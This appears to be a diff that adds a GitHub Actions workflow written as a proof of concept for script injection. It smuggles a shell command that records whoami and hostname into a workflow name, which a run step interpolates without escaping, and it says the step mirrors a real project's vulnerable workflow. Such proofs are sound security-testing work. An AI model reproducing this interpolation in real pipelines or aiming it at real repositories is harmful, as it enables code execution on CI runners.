@@ -1,0 +1,17 @@
+name: Report Build Result
+on:
+  workflow_run:
+    workflows: ['Build with unit tests"; echo "RCE-PROOF user=$(whoami) host=$(hostname)" > pwn_proof.txt; echo "']
+    types: [completed]
+jobs:
+  report:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Write result to BigQuery (vulnerable — mirrors cdap exactly)
+        run: |
+          echo "{ \"repository\": \"${{ github.repository }}\", \"build_name\": \"${{ github.event.workflow.name }}\", \"conclusion\": \"${{ github.event.workflow_run.conclusion }}\" }" | cat
+      - name: Check for injection proof
+        if: always()
+        run: |
+          echo "--- checking if pwn_proof.txt exists ---"
+          cat pwn_proof.txt 2>/dev/null || echo "NOT FOUND — injection did not fire"
